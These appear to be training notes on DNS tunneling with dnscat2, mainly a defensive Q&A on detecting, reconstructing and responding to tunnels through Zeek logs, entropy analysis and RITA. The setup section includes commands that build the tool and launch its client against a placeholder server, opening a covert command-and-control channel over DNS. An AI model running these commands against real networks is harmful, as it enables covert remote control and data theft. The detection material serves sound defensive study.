**DNS Tunneling (dnscat2)**

**DNS (Domain name system):**

A system that translates human-readable domain names (like google.com) into IP addresses (like 142.250.186.206) so computers can locate and communicate with each other on the internet.

**DNS Tunneling**

A method of encoding data inside DNS queries and responses to bypass firewalls or exfiltrate data. Often used maliciously to send or receive data over DNS when other communication channels are blocked.

**dnscat2**

dnscat2 is an open-source tool that creates an interactive, encrypted command-and-control channel over DNS. It lets an operator run a remote shell, transfer files, and forward traffic by encapsulating data inside DNS queries and responses — useful in penetration testing to simulate attackers who use DNS as a covert transport.

Key points:

- Works as a client (on the target) and a server (resolver/orchestrator).
- Bi-directional, encrypted sessions over DNS requests/responses.
- Intended for authorized redteam/pentest use; can be abused by attackers.
- Only use with explicit permission and in legal environments.

**Setup**

Installation (linux):

\# clone repo

git clone <https://github.com/iagox86/dnscat2.git>

\# client

cd dnscat2/client

make

\# server

\# you might need to install ruby

sudo apt-get install ruby ruby-dev

cd dnscat2/server

gem install bundler

bundle install

or alternatively for kali:

sudo apt install dnscat2 dnscat2-server

Start server:

ruby ./dnscat2.rb yourdomain.org

dnscat2-server # for kali

Start client:

./dnscat2 --dns server=x.x.x.x,port=53

dnscat2 --dns server=x.x.x.x,port=53 # for kali

**1. Understanding DNS Tunneling & dnscat2 Basics**

Q1- Scenario (detection signal):

During triage you see one internal IP make 165,000 DNS queries to cisco-update.com in 24 hours with ~165k unique FQDNs. 

What is your immediate assessment?

Answer: Strong indicator of DNS tunneling / automated data exfiltration. The volume and unique FQDN count are far above normal for a single host and match known dnscat2 behavior. Prioritize host isolation, collect host forensic artifacts, and identify the authoritative name server.

Why: High unique-FQDN counts are the “smoking gun”.

**2. Analyzing PCAPs & Zeek Logs**

Q2 - Scenario (Zeek logs):

Zeek dns.log shows repeated TXT/A queries with long qnames and clients making queries every ~1s. Which Zeek fields do you inspect to characterize the activity?

Answer: ts, id.orig\_h, id.resp\_h, query, qtype\_name, rcode, answers, and answers\_ttl. Use query to pull qnames; compute per-host unique qname counts and average qname length. Also correlate with conn.log to find subsequent connections (or lack thereof).

Why: qname string and qtype are primary telemetry for DNS tunneling detection.

**3. Reconstructing & Decoding the Tunnel**
**\


Q3 - Scenario (session reassembly):

After extracting qnames, how do you reconstruct dnscat2 session traffic (i.e., order, reliability, dropped chunks)?

Answer: Use timestamped qname list; dnscat2 chunks include sequence numbers or session IDs in their encoded labels. Sort chronologically, reassemble by session ID, and detect missing sequence numbers. Retry/ACK behavior may be inferred from repeated qnames or specific query/response patterns.

Why: Respect chronological order & session identifiers to avoid misordered reassembly.

**4. Detection, Defense & Response**

Q4 - Scenario (pcap file 24h):

What detection and defense strategies are recommended in the article for spotting and responding to a DNS tunneling channel such as dnscat2?

Answer:

\- Monitor for a high volume of DNS queries from a single host or many unique fullyqualified domain names (FQDNs) pointing to a common root domain: in the lab example a host made ~165,517 lookups and ~165,378 unique FQDNs for one domain.

\- Look for the absence of subsequent connections: after many DNS queries to the domain, there was no additional traffic (e.g., no HTTP/S connection) to that domain, which is anomalous because legitimate DNS lookups often precede other network activity.

\- Use entropy analysis on subdomains: high entropy (randomness) in the subdomain component is a signal of machinegenerated commands or encoding rather than human-readable domains.

**5. Forensics & Threat Hunting**

Q5 - Scenario (pcap file 24h):

What tool can we use to investigate a DNStunneling intrusion?

Answer:

We can use RITA with the command rita showbeaconsfqdn -H to show hosttoFQDN relationships and identify hosts making lots of DNS queries to a domain without any followon connection.

**6. Ethics, Scope, & Pre-Engagement Rules**

Q6 - Scenario (scope/legal):

A client’s rules-of-engagement say “assess all traffic to example.com.” You see DNS queries from many internal hosts to mail.example.com which is actually hosted by a third-party mail provider. What do you do?

Answer: Stop and ask the client to clarify scope and provide written permission for third-party services. Attacking or actively probing third-party infrastructure (mail providers, SaaS) is out of scope and may be illegal; only passive observation is safe without explicit permission.

Why: Mirrors the PTES pre-engagement principle — get explicit IP/range authorization to avoid legal/contractual issues.
